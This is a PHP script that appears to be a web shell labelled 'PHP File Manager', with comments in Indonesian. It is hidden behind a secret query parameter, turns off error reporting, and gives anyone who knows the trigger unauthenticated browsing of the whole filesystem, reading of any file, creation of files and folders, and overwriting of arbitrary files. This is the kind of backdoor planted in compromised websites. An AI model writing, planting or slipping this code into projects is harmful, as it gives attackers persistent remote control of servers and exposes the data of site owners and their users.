<?php
if (isset($_GET['ao']) && $_GET['ao'] === 'shell') {

    error_reporting(0);
    set_time_limit(0);

    $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
    $path = realpath($path);

    // Buat file baru
    if (isset($_POST['create_file']) && !empty($_POST['filename'])) {
        $newfile = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . $_POST['filename'];
        if (!file_exists($newfile)) {
            file_put_contents($newfile, '');
            echo "<b>✅ File created: " . htmlspecialchars($_POST['filename']) . "</b><br>";
        } else {
            echo "<b>❌ File already exists.</b><br>";
        }
    }

    // Buat folder baru
    if (isset($_POST['create_folder']) && !empty($_POST['foldername'])) {
        $newfolder = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . $_POST['foldername'];
        if (!is_dir($newfolder)) {
            mkdir($newfolder);
            echo "<b>✅ Folder created: " . htmlspecialchars($_POST['foldername']) . "</b><br>";
        } else {
            echo "<b>❌ Folder already exists.</b><br>";
        }
    }

    // Simpan file
    if (isset($_POST['save'])) {
        file_put_contents($_POST['filepath'], $_POST['content']);
        echo "<b>✅ File saved.</b><br>";
    }

    function breadcrumb($path) {
        $parts = explode(DIRECTORY_SEPARATOR, $path);
        $build = "";
        echo "<a href='?ao=shell&path=/'>/</a>";
        foreach ($parts as $part) {
            if ($part == "") continue;
            $build .= "/" . $part;
            echo "<a href='?ao=shell&path=" . urlencode($build) . "'>$part/</a>";
        }
    }

    echo "<h2>🗂️ PHP File Manager</h2>";
    breadcrumb($path);
    echo "<hr>";

    echo <<<FORMS
    <form method="POST">
        <input type="text" name="filename" placeholder="New file name" />
        <input type="submit" name="create_file" value="📄 Create File" />
    </form>
    <form method="POST">
        <input type="text" name="foldername" placeholder="New folder name" />
        <input type="submit" name="create_folder" value="📁 Create Folder" />
    </form>
    <hr>
FORMS;

    // Tampilkan isi direktori
    if (is_dir($path)) {
        $files = scandir($path);
        echo "<ul>";
        foreach ($files as $file) {
            $fullpath = $path . DIRECTORY_SEPARATOR . $file;
            $encoded = urlencode($fullpath);
            if (is_dir($fullpath)) {
                echo "<li>📁 <a href='?ao=shell&path=$encoded'>$file/</a></li>";
            } else {
                echo "<li>📄 <a href='?ao=shell&edit=$encoded'>$file</a></li>";
            }
        }
        echo "</ul>";
    }

    // Edit file
    if (isset($_GET['edit'])) {
        $file = $_GET['edit'];
        if (is_file($file)) {
            $content = htmlspecialchars(file_get_contents($file));
            echo "<h3>✏️ Editing: " . basename($file) . "</h3>";
            echo "<form method='POST'>
                    <input type='hidden' name='filepath' value='" . htmlspecialchars($file) . "' />
                    <textarea name='content' style='width:100%;height:300px;'>$content</textarea><br>
                    <input type='submit' name='save' value='💾 Save File'>
                  </form>";
        } else {
            echo "<b>File tidak ditemukan.</b>";
        }
    }

    exit;
}
?>
